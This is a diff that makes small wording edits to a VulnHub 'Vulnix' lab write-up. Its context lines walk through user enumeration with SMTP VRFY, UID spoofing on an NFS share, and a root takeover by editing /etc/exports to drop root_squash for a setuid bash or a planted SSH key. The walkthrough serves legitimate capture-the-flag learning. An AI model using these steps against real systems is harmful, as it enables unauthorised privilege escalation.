@@ -1,7 +1,7 @@
 ﻿### Vulnix Writeup
-So today it's the Vulnix machine by rebootuser which you can find hosted at https://www.vulnhub.com/entry/hacklab-vulnix,48/
+Today it's the Vulnix machine by Rebootuser which you can find hosted at https://www.vulnhub.com/entry/hacklab-vulnix,48/
 
-So we start off with the usual nmap scan and get a few random services and no web server on this one.
+We start off with the usual nmap scan and get a few random services and no web server on this one.
 ```
 nmap -v -sV -Pn -n 192.168.147.158 
 ```
@@ -42,7 +42,7 @@ VRFY crappy
 550 5.1.1 <crappy>: Recipient address rejected: User unknown in local recipient table
 ^C
 ```
-So what is in Vulnix's home folder? We try mounting it and if we force it to use nfs version 3 or lower we can see the UID and GID for the owner is 2008 which we will need in a second.
+What is in Vulnix's home folder? We try mounting it and if we force it to use nfs version 3 or lower we can see the UID and GID for the owner is 2008 which we will need in a second.
 ```
 root@sushi:/mnt# mount 192.168.147.158:/home/vulnix vulnix -o vers=3
 root@sushi:/mnt# ls -l
@@ -53,7 +53,7 @@ drwxr-x--- 2 2008 2008 4096 Sep  2  2012 vulnix
 root@sushi:/mnt# cd vulnix
 bash: cd: vulnix: Permission denied
 ```
-So awesome we can't actually access the folder, but I'm assuming if we have a user named vulnix with the same UID then it won't be a problem.
+Awesome we can't actually access the folder, but I'm assuming if we have a user named vulnix with the same UID then it won't be a problem.
 ```
 root@sushi:/mnt# useradd -u 2008 vulnix
 root@sushi:/mnt# su vulnix
@@ -143,7 +143,7 @@ Matching 'Defaults' entries for vulnix on this host:
 User vulnix may run the following commands on this host:
     (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports
 ```
-So looking at /etc/exports, we can disable the root_squashing for the vulnix home folder which will allow us to copy something like bash and give it setuid permissions. We could also add roots home folder to the /etc/exports with no_root_squash and echo in our ssh key to his authorized_keys and get root access that way.
+Looking at /etc/exports, we can disable the root_squashing for the vulnix home folder which will allow us to copy something like bash and give it setuid permissions. We could also add roots home folder to the /etc/exports with no_root_squash and echo in our ssh key to his authorized_keys and get root access that way.
 ```
 # /etc/exports: the access control list for filesystems which may be exported
 #               to NFS clients.  See exports(5).
@@ -188,6 +188,6 @@ trophy.txt
 bash-4.4# cat trophy.txt                           
 cc614640424f5bd60ce5d5264899c3be                   
 ```
-So that was pretty fun, having to reboot the machine was different and the rest of it was interesting learning a bit about and using nfs for the first time in awhile.  As always thanks to VulnHub and the author rebootuser for the hard work.
+That was pretty fun and difficult, having to reboot the machine was different and the rest of it was interesting learning a bit about and using nfs for the first time in awhile.  As always thanks to VulnHub and the author Rebootuser for all the hard work.
 
 
